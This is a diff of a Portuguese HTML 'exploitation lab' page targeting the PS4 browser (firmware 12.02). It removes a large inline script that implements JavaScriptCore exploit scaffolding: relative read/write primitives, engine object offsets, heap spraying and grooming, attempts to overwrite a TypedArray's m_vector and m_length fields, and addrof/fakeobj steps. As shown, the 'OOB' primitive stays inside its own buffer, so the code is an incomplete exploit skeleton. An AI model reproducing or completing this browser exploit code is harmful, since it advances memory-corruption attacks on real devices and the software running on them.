@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>Laboratório de Exploração Avançada (v2.7.2 - Correção Teste Modularidade PS4)</title>
+    <title>Laboratório de Exploração Avançada (v2.8.0 - Modularizado PS4)</title>
     <style>
         body { background: #1e1e1e; color: #d4d4d4; font-family: monospace; padding: 10px; font-size: 13px; }
         .container { margin-bottom: 20px; padding: 10px; background-color: #252526; border: 1px solid #333; border-radius: 5px; }
@@ -16,7 +16,7 @@
     </style>
 </head>
 <body>
-    <h1>Laboratório (v2.7.2 - Correção Teste Modularidade PS4 FW 12.02)</h1>
+    <h1>Laboratório (v2.8.0 - Modularizado PS4 FW 12.02)</h1>
     <p class="notes">Foco: Modularidade, Grooming agressivo, corrupção de m_vector/m_length, testes de R/W OOB, conceitos de addrof/fakeobj.</p>
     <p class="notes">ALTO RISCO DE CRASH! Anote o último GAP/teste bem-sucedido se o navegador fechar.</p>
 
@@ -28,9 +28,14 @@
     </div>
 
     <div id="logOutput"></div>
+
+    <div class="container" id="moduleTestButtons">
+        <h3>Testes de Módulos Individuais</h3>
+        </div>
+
     <div class="container">
         <h2>Passo 0: Ativar Primitiva OOB</h2>
-        <button onclick="CoreExploitLib.triggerOOB_primitive()">Ativar Primitiva OOB</button>
+        <button id="btnTriggerOOB">Ativar Primitiva OOB</button>
     </div>
 
     <div class="container">
@@ -38,7 +43,7 @@
         <p class.notes>Vítima e Buffer OOB devem ter o mesmo tamanho (controlado por 'OOB Alloc Size').</p>
         <label for="sprayCountBase">Spray Count (Base):</label> <input type="number" id="sprayCountBase" value="500">
         <label for="intermediateAllocs">Intermediate Allocs:</label> <input type="number" id="intermediateAllocs" value="100">
-        <button onclick="App.runAllGroomingStrategies()">Executar Todas Estratégias de Grooming & Busca de GAP</button>
+        <button id="btnRunGroomingStrategies">Executar Todas Estratégias de Grooming & Busca de GAP</button>
     </div>
 
      <div class="container">
@@ -48,542 +53,28 @@
             <label for="gapStartScan">GAP Início:</label> <input type="number" id="gapStartScan" value="-64">
             <label for="gapEndScan">GAP Fim:</label> <input type="number" id="gapEndScan" value="128">
             <label for="gapStepScan">Passo GAP:</label> <input type="number" id="gapStepScan" value="4">
-            <button onclick="App.updateCurrentTestGapFromScanUIAndTestSingle()">Testar GAP Início como Único</button>
+            <button id="btnTestSingleGap">Testar GAP Início como Único</button>
         </div>
-        <button onclick="VictimCorruptorLib.findAndCorruptVictimFields_Iterative()">Iniciar Busca & Corrupção Iterativa (com config atual)</button>
-        <button onclick="VictimCorruptorLib.testCorruptKnownGap()">Testar Corrupção no Último GAP de Sucesso</button>
+        <button id="btnFindAndCorruptIterative">Iniciar Busca & Corrupção Iterativa (com config atual)</button>
+        <button id="btnTestKnownGap">Testar Corrupção no Último GAP de Sucesso</button>
     </div>
 
     <div class="container">
         <h2>Passo 3: (Conceitual) Preparar Par addrof/fakeobj</h2>
         <p class="notes">Tenta usar a R/W OOB para fazer o m_vector de 'arr_leaker' apontar para 'arr_marker'. Requer um GAP de sucesso do Passo 2.</p>
         <label for="addrofGap">GAP para addrof:</label> <input type="number" id="addrofGap" value="">
-        <button onclick="PostExploitLib_Conceptual.setup_addrof_fakeobj_pair_conceptual()">Preparar Par addrof/fakeobj (Conceitual)</button>
+        <button id="btnSetupAddrofConceptual">Preparar Par addrof/fakeobj (Conceitual)</button>
     </div>
 
     <div class="container">
         <h2>Passo 4: (Conceitual) Testar addrof/fakeobj</h2>
         <label for="objNameToLeak">Nome da Var Global para addrof (ex: 'PostExploitLib_Conceptual.arr_marker'):</label> <input type="text" id="objNameToLeak" style="width:250px" value="PostExploitLib_Conceptual.arr_marker">
-        <button onclick="PostExploitLib_Conceptual.test_addrof_conceptual()">Testar addrof (Conceitual)</button>
+        <button id="btnTestAddrofConceptual">Testar addrof (Conceitual)</button>
         <br>
         <label for="fakeObjAddrHex">Endereço Hex para fakeobj:</label> <input type="text" id="fakeObjAddrHex" value="0x4141414142424242">
-        <button onclick="PostExploitLib_Conceptual.test_fakeobj_conceptual()">Testar fakeobj (Conceitual)</button>
+        <button id="btnTestFakeobjConceptual">Testar fakeobj (Conceitual)</button>
     </div>
 
-
-    <script>
-        // ===================================================================================
-        // MÓDULO: UtilsLib
-        // ===================================================================================
-        const UtilsLib = {
-            logToDiv: (divId, message, type = 'info', funcName = '') => {
-                const outputDiv = document.getElementById(divId);
-                if (!outputDiv) { console.error("UtilsLib.logToDiv: Div de log não encontrado:", divId); return; }
-                try {
-                    const timestamp = `[${new Date().toLocaleTimeString()}]`;
-                    const prefix = funcName ? `[${funcName}] ` : '';
-                    const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
-                    const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation', 'tool', 'analysis'].includes(type) ? type : 'info';
-                    if(outputDiv.innerHTML.length > 1200000){ // Limitar tamanho do log
-                        outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 600000);
-                        outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML;
-                    }
-                    outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
-                    outputDiv.scrollTop = outputDiv.scrollHeight;
-                } catch(e) {
-                    console.error(`Erro no UtilsLib.logToDiv para ${divId}:`, e);
-                    if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`;
-                }
-            },
-
-            toHexLab: (val, bits = 32) => {
-                if (val instanceof Int64Lib.AdvancedInt64) return val.toString(true);
-                if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid';
-                let num = Number(val);
-                if (bits <= 32) { num = num >>> 0; }
-                const pad = Math.ceil(bits / 4);
-                return '0x' + num.toString(16).toUpperCase().padStart(pad, '0');
-            },
-
-            PAUSE_LAB: (ms = 100) => new Promise(r => setTimeout(r, ms)),
-
-            testModule: () => {
-                // CORREÇÃO: Usar a função 'log' global que já está bindada ao 'logOutput'
-                log("--- Testando Módulo UtilsLib ---", "test", "UtilsLib.test");
-                log("Mensagem de log normal.", "info", "UtilsLib.test");
-                log("Mensagem de erro.", "error", "UtilsLib.test");
-                // Usar this.toHexLab ou UtilsLib.toHexLab para funções dentro do mesmo "módulo"
-                log(`toHexLab(12345): ${UtilsLib.toHexLab(12345)}`, "info", "UtilsLib.test");
-                log("Teste UtilsLib concluído.", "good", "UtilsLib.test");
-            }
-        };
-        // Alias globais para conveniência
-        const log = UtilsLib.logToDiv.bind(null, 'logOutput');
-        const PAUSE_LAB = UtilsLib.PAUSE_LAB;
-        const toHexS1 = UtilsLib.toHexLab;
-
-        // ===================================================================================
-        // MÓDULO: Int64Lib
-        // ===================================================================================
-        const Int64Lib = {
-            AdvancedInt64: class AdvancedInt64 {
-                constructor(low, high) {
-                    this.buffer = new Uint32Array(2);
-                    this.bytes = new Uint8Array(this.buffer.buffer);
-
-                    if (arguments.length === 0) { this.buffer[0] = 0; this.buffer[1] = 0; return; }
-
-                    if (typeof low === 'string') {
-                        let hexstr = low.startsWith("0x") ? low.substring(2) : low;
-                        if (hexstr.length % 2 !== 0) hexstr = '0' + hexstr;
-                        if (hexstr.length > 16) hexstr = hexstr.substring(hexstr.length - 16);
-                        else hexstr = hexstr.padStart(16, '0');
-                        for (let i = 0; i < 8; i++) { this.bytes[i] = parseInt(hexstr.slice(14 - i * 2, 16 - i * 2), 16); }
-                    } else if (typeof low === 'number') {
-                        this.buffer[0] = low;
-                        if (arguments.length === 1) { this.buffer[1] = (low < 0 && Math.abs(low) > 0xFFFFFFFF) ? -1 : 0; }
-                        else if (typeof high === 'number') { this.buffer[1] = high; }
-                        else { throw TypeError('High argument must be a number if provided and low is a number.'); }
-                    } else if (low instanceof AdvancedInt64) {
-                        this.buffer[0] = low.low(); this.buffer[1] = low.high();
-                    } else if (low instanceof Uint8Array && low.length === 8) {
-                        this.bytes.set(low);
-                    } else { throw TypeError('AdvancedInt64: Invalid constructor arguments.'); }
-                }
-                low() { return this.buffer[0]; }
-                high() { return this.buffer[1]; }
-                toString(pretty = false) { let hS = (this.high()>>>0).toString(16).padStart(8,'0'); let lS = (this.low()>>>0).toString(16).padStart(8,'0'); return pretty ? `0x${hS.substring(0,4)}_${hS.substring(4)}_${lS.substring(0,4)}_${lS.substring(4)}` : `0x${hS}${lS}`; }
-                add(o) { o=!(o instanceof AdvancedInt64)?new AdvancedInt64(o):o; let nL=(this.low()+o.low())>>>0; let c=((this.low()&0xFFFFFFFF)+(o.low()&0xFFFFFFFF)>0xFFFFFFFF)?1:0; let nH=(this.high()+o.high()+c)>>>0; return new AdvancedInt64(nL,nH); }
-                sub(o) { o=!(o instanceof AdvancedInt64)?new AdvancedInt64(o):o; return this.add(o.neg()); }
-                neg() { const l=~this.low(); const h=~this.high(); return new AdvancedInt64(l,h).add(AdvancedInt64.One); }
-                equals(o) { o=!(o instanceof AdvancedInt64)?new AdvancedInt64(o):o; return this.low()===o.low()&&this.high()===o.high(); }
-                isZero() { return this.low() === 0 && this.high() === 0; }
-                isNegativeOne() { return this.low() === 0xFFFFFFFF && this.high() === 0xFFFFFFFF; }
-                static fromParts(l,h){return new AdvancedInt64(l,h);} static fromNumber(n){return new AdvancedInt64(n);}
-            },
-            testModule: () => {
-                log("--- Testando Módulo Int64Lib ---", "test", "Int64Lib.test");
-                const AdvancedInt64 = Int64Lib.AdvancedInt64; // Alias local para clareza
-                const a = new AdvancedInt64("0x100000000"); // 2^32
-                const b = new AdvancedInt64(1,1); // 0x00000001_00000001
-                const c = AdvancedInt64.fromNumber(-1);
-                log(`a = ${a.toString(true)}`, "info", "Int64Lib.test");
-                log(`b = ${b.toString(true)}`, "info", "Int64Lib.test");
-                log(`c = ${c.toString(true)} (isNegativeOne: ${c.isNegativeOne()})`, "info", "Int64Lib.test");
-                log(`a + b = ${a.add(b).toString(true)}`, "info", "Int64Lib.test");
-                log(`a - b = ${a.sub(b).toString(true)}`, "info", "Int64Lib.test");
-                log(`b.equals(new AdvancedInt64(1,1)): ${b.equals(new AdvancedInt64(1,1))}`, "info", "Int64Lib.test");
-                log(`b.isZero(): ${b.isZero()}`, "info", "Int64Lib.test");
-                log("Teste Int64Lib concluído.", "good", "Int64Lib.test");
-            }
-        };
-        Int64Lib.AdvancedInt64.Zero = new Int64Lib.AdvancedInt64(0,0);
-        Int64Lib.AdvancedInt64.One = new Int64Lib.AdvancedInt64(1,0);
-        Int64Lib.AdvancedInt64.NegOne = new Int64Lib.AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
-        Int64Lib.AdvancedInt64.NullPtr = new Int64Lib.AdvancedInt64(0,0);
-
-
-        // ===================================================================================
-        // MÓDULO: CoreExploitLib (Globais e Primitivas OOB)
-        // ===================================================================================
-        const CoreExploitLib = {
-            oob_array_buffer_real: null,
-            oob_dataview_real: null,
-            baseOffsetInBuffer: 128,
-            initialBufferSize: 32,
-            OOB_ALLOCATION_SIZE: 288,
-
-            JSC_OFFSETS: {
-                ArrayBuffer: { PTR_INTERNAL_STRUCT_OFFSET: 0x20, BYTELENGTH_IN_STRUCT_OFFSET: 0x20 },
-                TypedArray: { M_VECTOR_OFFSET: 0x10, M_LENGTH_OFFSET: 0x18, ASSOCIATED_ARRAYBUFFER_OFFSET: 0x30 },
-                JSFunction: { M_EXECUTABLE_OFFSET: 0x18 }
-            },
-
-            updateGlobalConfigs: () => {
-                CoreExploitLib.OOB_ALLOCATION_SIZE = parseInt(document.getElementById('oobAllocSize').value) || 288;
-                CoreExploitLib.baseOffsetInBuffer = parseInt(document.getElementById('baseOffset').value) || 128;
-                CoreExploitLib.initialBufferSize = parseInt(document.getElementById('initialBufSize').value) || 32;
-                log(`Configs CoreExploitLib atualizadas: OOB_ALLOC_SIZE=${CoreExploitLib.OOB_ALLOCATION_SIZE}, BaseOffset=${CoreExploitLib.baseOffsetInBuffer}, InitialBufSize=${CoreExploitLib.initialBufferSize}`, "tool", "CoreExploitLib.Config");
-            },
-
-            triggerOOB_primitive: async () => {
-                const FNAME = 'CoreExploitLib.triggerOOB_primitive';
-                CoreExploitLib.updateGlobalConfigs();
-                log(`--- Iniciando ${FNAME} ---`, 'test', FNAME);
-                const writeValueToTriggerOOB = 0xEE;
-                const oobWriteOffsetFromLogicalStart = CoreExploitLib.initialBufferSize;
-
-                CoreExploitLib.oob_array_buffer_real = null; CoreExploitLib.oob_dataview_real = null;
-                try {
-                    const totalSizeNeeded = CoreExploitLib.baseOffsetInBuffer + oobWriteOffsetFromLogicalStart + CoreExploitLib.OOB_ALLOCATION_SIZE + 64; // Margem de segurança
-                    CoreExploitLib.oob_array_buffer_real = new ArrayBuffer(totalSizeNeeded);
-                    CoreExploitLib.oob_dataview_real = new DataView(CoreExploitLib.oob_array_buffer_real);
-                    log(`   oob_array_buffer_real alocado com ${CoreExploitLib.oob_dataview_real.buffer.byteLength} bytes.`, "info", FNAME);
-                    for (let i = 0; i < CoreExploitLib.oob_dataview_real.buffer.byteLength; i++) { CoreExploitLib.oob_dataview_real.setUint8(i, 0xAA); }
-
-                    const initialOOBWriteAbsoluteAddr = CoreExploitLib.baseOffsetInBuffer + oobWriteOffsetFromLogicalStart;
-                    log(`   Escrita OOB inicial (sentinela 0x${writeValueToTriggerOOB.toString(16)}) em abs_offset DV: ${initialOOBWriteAbsoluteAddr}`, 'info', FNAME);
-                    CoreExploitLib.oob_dataview_real.setUint8(initialOOBWriteAbsoluteAddr, writeValueToTriggerOOB);
-                    log(`   Primitiva de escrita OOB relativa inicial ativada.`, 'vuln', FNAME);
-                } catch(e) {
-                    log(`ERRO CRÍTICO em ${FNAME}: ${e.message} ${e.stack ? "\nStack: "+e.stack : ''}`, "error", FNAME); console.error(`ERRO CRÍTICO em ${FNAME}:`, e);
-                } finally {
-                    log(`--- ${FNAME} Concluído ---`, 'test', FNAME);
-                    if (CoreExploitLib.oob_dataview_real && CoreExploitLib.oob_array_buffer_real) {
-                        log("`oob_dataview_real` e `oob_array_buffer_real` estão configurados.", "good", FNAME);
-                    } else { log("`oob_dataview_real` OU `oob_array_buffer_real` NÃO foram definidos!", "error", FNAME); }
-                }
-            },
-
-            oob_read_relative: (relative_offset, num_bytes = 4) => {
-                const FNAME_READ = "CoreExploitLib.oob_read_relative";
-                if (!CoreExploitLib.oob_dataview_real) { log(`ERRO (${FNAME_READ}): oob_dataview_real não pronto!`, "error"); return null; }
-                const absolute_offset_in_dv = CoreExploitLib.baseOffsetInBuffer + relative_offset;
-                if (absolute_offset_in_dv < 0 || absolute_offset_in_dv + num_bytes > CoreExploitLib.oob_dataview_real.buffer.byteLength) { return null; }
-                try {
-                    let value;
-                    switch (num_bytes) {
-                        case 1: value = CoreExploitLib.oob_dataview_real.getUint8(absolute_offset_in_dv); break;
-                        case 2: value = CoreExploitLib.oob_dataview_real.getUint16(absolute_offset_in_dv, true); break;
-                        case 4: value = CoreExploitLib.oob_dataview_real.getUint32(absolute_offset_in_dv, true); break;
-                        case 8: value = new Int64Lib.AdvancedInt64(CoreExploitLib.oob_dataview_real.getUint32(absolute_offset_in_dv, true), CoreExploitLib.oob_dataview_real.getUint32(absolute_offset_in_dv + 4, true)); break;
-                        default: log(`ERRO (${FNAME_READ}): Bytes inválidos: ${num_bytes}`, "error"); return null;
-                    }
-                    return value;
-                } catch (e) { return null; }
-            },
-
-            oob_write_relative: (relative_offset, value, num_bytes = 4) => {
-                const FNAME_WRITE = "CoreExploitLib.oob_write_relative";
-                if (!CoreExploitLib.oob_dataview_real) { log(`ERRO (${FNAME_WRITE}): oob_dataview_real não pronto!`, "error"); return; }
-                const absolute_offset_in_dv = CoreExploitLib.baseOffsetInBuffer + relative_offset;
-                if (absolute_offset_in_dv < 0 || absolute_offset_in_dv + num_bytes > CoreExploitLib.oob_dataview_real.buffer.byteLength) { log(`ERRO Escrita Relativa: abs_offset ${absolute_offset_in_dv} fora dos limites`, "error", FNAME_WRITE); return; }
-                try {
-                    switch (num_bytes) {
-                        case 1: CoreExploitLib.oob_dataview_real.setUint8(absolute_offset_in_dv, Number(value)); break;
-                        case 2: CoreExploitLib.oob_dataview_real.setUint16(absolute_offset_in_dv, Number(value), true); break;
-                        case 4: CoreExploitLib.oob_dataview_real.setUint32(absolute_offset_in_dv, Number(value), true); break;
-                        case 8:
-                            let val64 = value instanceof Int64Lib.AdvancedInt64 ? value : new Int64Lib.AdvancedInt64(value);
-                            CoreExploitLib.oob_dataview_real.setUint32(absolute_offset_in_dv, val64.low(), true);
-                            CoreExploitLib.oob_dataview_real.setUint32(absolute_offset_in_dv + 4, val64.high(), true);
-                            break;
-                        default: log(`ERRO (${FNAME_WRITE}): Bytes inválidos: ${num_bytes}`, "error"); return;
-                    }
-                } catch (e) { log(`ERRO em ${FNAME_WRITE} (abs ${absolute_offset_in_dv}): ${e.message}`, "error"); }
-            },
-            testModule: async () => {
-                log("--- Testando Módulo CoreExploitLib (OOB Primitives) ---", "test", "CoreExploitLib.test");
-                await CoreExploitLib.triggerOOB_primitive();
-                if (!CoreExploitLib.oob_dataview_real) {
-                    log("Falha ao ativar primitiva OOB. Teste abortado.", "error", "CoreExploitLib.test");
-                    return;
-                }
-                const test_rel_offset = CoreExploitLib.initialBufferSize + 16; // Exemplo de offset dentro da área "OOB lógica"
-                const test_val32 = 0x12345678;
-                const test_val64 = new Int64Lib.AdvancedInt64("0xAABBCCDDEEFF0011");
-
-                log(`Escrevendo ${toHexS1(test_val32)} em offset relativo ${test_rel_offset}`, "info", "CoreExploitLib.test");
-                CoreExploitLib.oob_write_relative(test_rel_offset, test_val32, 4);
-                const read_val32 = CoreExploitLib.oob_read_relative(test_rel_offset, 4);
-                if (read_val32 === test_val32) {
-                    log(`SUCESSO: Lido ${toHexS1(read_val32)} corretamente. Primitiva R/W 32bit OOB relativa parece funcional.`, "good", "CoreExploitLib.test");
-                } else {
-                    log(`FALHA: Lido ${toHexS1(read_val32)}, esperado ${toHexS1(test_val32)}.`, "error", "CoreExploitLib.test");
-                }
-
-                log(`Escrevendo ${test_val64.toString(true)} em offset relativo ${test_rel_offset + 4}`, "info", "CoreExploitLib.test");
-                CoreExploitLib.oob_write_relative(test_rel_offset + 4, test_val64, 8);
-                const read_val64 = CoreExploitLib.oob_read_relative(test_rel_offset + 4, 8);
-                if (read_val64 instanceof Int64Lib.AdvancedInt64 && read_val64.equals(test_val64)) {
-                    log(`SUCESSO: Lido ${read_val64.toString(true)} corretamente. Primitiva R/W 64bit OOB relativa parece funcional.`, "good", "CoreExploitLib.test");
-                } else {
-                    log(`FALHA: Lido ${read_val64 ? read_val64.toString(true) : "null/erro"}, esperado ${test_val64.toString(true)}.`, "error", "CoreExploitLib.test");
-                }
-                log("Teste CoreExploitLib concluído.", "good", "CoreExploitLib.test");
-            }
-        };
-
-        // ===================================================================================
-        // MÓDULO: HeapGroomerLib
-        // ===================================================================================
-        const HeapGroomerLib = { /* ... implementação como na v2.7.1 ... */
-            victim_object: null,
-            victim_object_type: 'TypedArray',
-            spray_array_temp: [],
-
-            groomHeapForSameSize: async function(spray_count, object_size, intermediate_alloc_count, victim_first = true) {
-                const FNAME_GROOM = "HeapGroomerLib.groomHeap";
-                log(`Iniciando heap grooming (obj_size=${object_size}, spray_count=${spray_count}, inter=${intermediate_alloc_count}, victim_first=${victim_first})`, "tool", FNAME_GROOM);
-                this.spray_array_temp = [];
-                const fill_size = object_size * 2 > 0 ? object_size * 2 : object_size + 16;
-                log(`   Fase 1: Spray com ${fill_size} bytes. Contagem: ${Math.floor(spray_count / 2)}`, "info", FNAME_GROOM);
-                for (let i = 0; i < Math.floor(spray_count / 2); i++) { this.spray_array_temp.push(new ArrayBuffer(fill_size)); }
-                log(`   Fase 2: Criando ${intermediate_alloc_count} buracos de ${object_size} bytes.`, "info", FNAME_GROOM);
-                let holes = [];
-                for (let i = 0; i < intermediate_alloc_count; i++) { holes.push(new ArrayBuffer(object_size)); }
-                for (let i = 0; i < intermediate_alloc_count; i = i + 2) { holes[i] = null; }
-                log(`   Fase 3: Spray final com ${object_size} bytes. Contagem: ${spray_count}`, "info", FNAME_GROOM);
-                for (let i = 0; i < spray_count; i++) { this.spray_array_temp.push(new ArrayBuffer(object_size)); }
-                if (typeof globalThis.gc === 'function') {
-                    log("Tentando forçar GC (x3)...", "tool", FNAME_GROOM);
-                    try { globalThis.gc(); await PAUSE_LAB(50); globalThis.gc(); await PAUSE_LAB(50); globalThis.gc();}
-                    catch(e){ log("Falha ao forçar GC: " + e.message, "warn", FNAME_GROOM);}
-                }
-                log("Heap grooming (tentativa) concluído.", "warn", FNAME_GROOM);
-            },
-
-            prepareVictim: async function(object_size) {
-                const FNAME_PREP_VICTIM = "HeapGroomerLib.prepareVictim";
-                this.victim_object = null;
-                this.victim_object_type = 'TypedArray';
-                const victim_typed_array_elements = object_size / 4;
-                if (object_size % 4 !== 0) {
-                    log("ERRO CRÍTICO: Tamanho alvo não é múltiplo de 4 para Uint32Array.", "error", FNAME_PREP_VICTIM); return false;
-                }
-                this.victim_object = new Uint32Array(victim_typed_array_elements);
-                for(let i=0; i < this.victim_object.length; i++) { this.victim_object[i] = (0xBB000000 | i) ; }
-                log(`Vítima (${this.victim_object_type}, ${this.victim_object.length} elems, ${this.victim_object.byteLength}b) alocada. Padrão: 0xBB00xxxx`, 'good', FNAME_PREP_VICTIM);
-                return true;
-            }
-         };
-
-        // ===================================================================================
-        // MÓDULO: VictimCorruptorLib
-        // ===================================================================================
-        const VictimCorruptorLib = { /* ... implementação como na v2.7.1 ... */
-            CURRENT_TEST_GAP: 0,
-            last_successful_gap: null,
-            FNAME_BASE: "VictimCorruptorLib",
-
-            testCorruptKnownGap: async function() {
-                if (this.last_successful_gap === null) {
-                    log("Nenhum GAP de sucesso conhecido para testar.", "warn", `${this.FNAME_BASE}.testCorruptKnownGap`);
-                    return;
-                }
-                log(`Testando corrupção no GAP conhecido: ${this.last_successful_gap}`, "test", `${this.FNAME_BASE}.testCorruptKnownGap`);
-                await this.try_corrupt_fields_for_gap(this.last_successful_gap);
-            },
-
-            try_corrupt_fields_for_gap: async function(current_gap_to_test) {
-                const FNAME_TRY_FIELDS = `${this.FNAME_BASE}.try_corrupt_fields_for_gap`;
-                let result = { gap: current_gap_to_test, mvector_corrupted: false, mlength_corrupted: false, mvector_read: "N/A", mlength_read: "N/A", crashed_or_error: false };
-
-                if (HeapGroomerLib.victim_object_type !== 'TypedArray' || !HeapGroomerLib.victim_object) { log("Vítima não é TypedArray ou não alocada.", "error", FNAME_TRY_FIELDS); return result; }
-                if (!CoreExploitLib.oob_dataview_real) { log("Primitiva OOB não ativa.", "error", FNAME_TRY_FIELDS); return result; }
-
-                const victim_jscell_rel_offset_from_oob_logical_start = CoreExploitLib.initialBufferSize + current_gap_to_test;
-                const m_vector_field_abs_offset_in_jscell = CoreExploitLib.JSC_OFFSETS.TypedArray.M_VECTOR_OFFSET;
-                const m_vector_field_rel_offset_from_oob_base = victim_jscell_rel_offset_from_oob_logical_start + m_vector_field_abs_offset_in_jscell;
-                const m_vector_field_abs_offset_in_dv = CoreExploitLib.baseOffsetInBuffer + m_vector_field_rel_offset_from_oob_base;
-
-                log(`  GAP ${current_gap_to_test}: Tentando R/W m_vector em abs_dv_offset ${m_vector_field_abs_offset_in_dv}`, "subtest", FNAME_TRY_FIELDS);
-                if (m_vector_field_abs_offset_in_dv < 0 || m_vector_field_abs_offset_in_dv + 8 > CoreExploitLib.oob_dataview_real.buffer.byteLength) {
-                    log(`     ↳ m_vector target FORA DO ALCANCE. Pulando GAP.`, "warn", FNAME_TRY_FIELDS); return result;
-                }
-                let original_mvector = CoreExploitLib.oob_read_relative(m_vector_field_rel_offset_from_oob_base, 8);
-                if (original_mvector instanceof Int64Lib.AdvancedInt64 && !original_mvector.isZero() && !original_mvector.toString(false).toLowerCase().includes("aaaa")) {
-                    result.mvector_read = original_mvector.toString(true);
-                    log(`     ↳ GAP ${current_gap_to_test}: ACHADO m_vector ORIGINAL POTENCIAL: ${result.mvector_read}`, "leak", FNAME_TRY_FIELDS);
-                } else { log(`     ↳ GAP ${current_gap_to_test}: Leitura do m_vector original retornou lixo/zero.`, "info", FNAME_TRY_FIELDS); }
-
-                const crash_test_mvector_addr = Int64Lib.AdvancedInt64.One;
-                log(`       Tentando escrever NOVO m_vector: ${crash_test_mvector_addr.toString(true)} ...`, "vuln", FNAME_TRY_FIELDS);
-                CoreExploitLib.oob_write_relative(m_vector_field_rel_offset_from_oob_base, crash_test_mvector_addr, 8); await PAUSE_LAB(50);
-                let written_mvector = CoreExploitLib.oob_read_relative(m_vector_field_rel_offset_from_oob_base, 8);
-                if (written_mvector instanceof Int64Lib.AdvancedInt64 && written_mvector.equals(crash_test_mvector_addr)) {
-                    log(`       CONFIRMADO: m_vector sobrescrito para ${written_mvector.toString(true)}`, "good", FNAME_TRY_FIELDS); result.mvector_corrupted = true;
-                } else { log(`       FALHA: m_vector NÃO foi sobrescrito. Lido: ${written_mvector ? written_mvector.toString(true) : "null/erro"}`, "warn", FNAME_TRY_FIELDS); }
-                try {
-                    log(`       Tentando acessar victim_object[0] (m_vector=${crash_test_mvector_addr.toString(true)})...`, "critical", FNAME_TRY_FIELDS);
-                    let val = HeapGroomerLib.victim_object[0]; // Acesso que pode crashar
-                    log(`       ACESSO A victim_object[0] NÃO CRASHOU. Valor lido: ${toHexS1(val)}`, "warn", FNAME_TRY_FIELDS);
-                } catch (e) {
-                    log(`       CRASH/ERRO ESPERADO (m_vector): ${e.message}`, "good", FNAME_TRY_FIELDS); result.crashed_or_error = true; result.mvector_corrupted = true; this.last_successful_gap = current_gap_to_test;
-                    log(`GAP ${current_gap_to_test} MARCADO COMO SUCESSO (CRASH M_VECTOR)!`, "vuln", FNAME_TRY_FIELDS); return result;
-                }
-                if (original_mvector instanceof Int64Lib.AdvancedInt64 && !original_mvector.isZero() && result.mvector_corrupted) {
-                    log(`       Restaurando m_vector original: ${original_mvector.toString(true)}`, "tool", FNAME_TRY_FIELDS);
-                    CoreExploitLib.oob_write_relative(m_vector_field_rel_offset_from_oob_base, original_mvector, 8); await PAUSE_LAB(50);
-                }
-
-                const m_length_field_abs_offset_in_jscell = CoreExploitLib.JSC_OFFSETS.TypedArray.M_LENGTH_OFFSET;
-                const m_length_field_rel_offset_from_oob_base = victim_jscell_rel_offset_from_oob_logical_start + m_length_field_abs_offset_in_jscell;
-                const m_length_field_abs_offset_in_dv = CoreExploitLib.baseOffsetInBuffer + m_length_field_rel_offset_from_oob_base;
-                log(`  GAP ${current_gap_to_test}: Tentando R/W m_length em abs_dv_offset ${m_length_field_abs_offset_in_dv}`, "subtest", FNAME_TRY_FIELDS);
-                if (m_length_field_abs_offset_in_dv < 0 || m_length_field_abs_offset_in_dv + 4 > CoreExploitLib.oob_dataview_real.buffer.byteLength) {
-                    log(`     ↳ m_length target FORA DO ALCANCE.`, "warn", FNAME_TRY_FIELDS);
-                } else {
-                    let original_mlength = CoreExploitLib.oob_read_relative(m_length_field_rel_offset_from_oob_base, 4);
-                    if (typeof original_mlength === 'number' && HeapGroomerLib.victim_object && original_mlength === HeapGroomerLib.victim_object.length) { // Checar se victim_object existe
-                        result.mlength_read = toHexS1(original_mlength); log(`     ↳ GAP ${current_gap_to_test}: ACHADO m_length ORIGINAL: ${result.mlength_read}`, "leak", FNAME_TRY_FIELDS);
-                    } else { log(`     ↳ GAP ${current_gap_to_test}: Leitura do m_length original retornou ${toHexS1(original_mlength)}.`, "info", FNAME_TRY_FIELDS); }
-                    const large_mlength_val = 0x7FFFFFFF;
-                    log(`       Tentando escrever NOVO m_length: ${toHexS1(large_mlength_val)} ...`, "vuln", FNAME_TRY_FIELDS);
-                    CoreExploitLib.oob_write_relative(m_length_field_rel_offset_from_oob_base, large_mlength_val, 4); await PAUSE_LAB(50);
-                    let written_mlength = CoreExploitLib.oob_read_relative(m_length_field_rel_offset_from_oob_base, 4);
-                    if (typeof written_mlength === 'number' && written_mlength === large_mlength_val) {
-                        log(`       CONFIRMADO: m_length sobrescrito para ${toHexS1(written_mlength)}`, "good", FNAME_TRY_FIELDS); result.mlength_corrupted = true;
-                    } else { log(`       FALHA: m_length NÃO foi sobrescrito. Lido: ${toHexS1(written_mlength)}`, "warn", FNAME_TRY_FIELDS); }
-                    if (result.mlength_corrupted && HeapGroomerLib.victim_object) { // Checar se victim_object existe
-                        try { const far_index = HeapGroomerLib.victim_object.length + 100000; log(`       Tentando acessar victim_object[${far_index}] (m_length=${toHexS1(large_mlength_val)})...`, "critical", FNAME_TRY_FIELDS); let val = HeapGroomerLib.victim_object[far_index]; log(`       ACESSO A victim_object[${far_index}] NÃO CRASHOU. Valor lido: ${toHexS1(val)}`, "warn", FNAME_TRY_FIELDS);
-                        } catch (e) { log(`       CRASH/ERRO ESPERADO (m_length): ${e.message}`, "good", FNAME_TRY_FIELDS); result.crashed_or_error = true; this.last_successful_gap = current_gap_to_test; log(`GAP ${current_gap_to_test} MARCADO COMO SUCESSO (CRASH M_LENGTH)!`, "vuln", FNAME_TRY_FIELDS); }
-                    }
-                    if (typeof original_mlength === 'number' && result.mlength_corrupted) {
-                        log(`       Restaurando m_length original: ${toHexS1(original_mlength)}`, "tool", FNAME_TRY_FIELDS);
-                        CoreExploitLib.oob_write_relative(m_length_field_rel_offset_from_oob_base, original_mlength, 4);
-                    }
-                }
-                return result;
-            },
-
-            findAndCorruptVictimFields_Iterative: async function() {
-                const FNAME = `${this.FNAME_BASE}.findAndCorrupt`;
-                log(`--- Iniciando ${FNAME} ---`, 'test', FNAME);
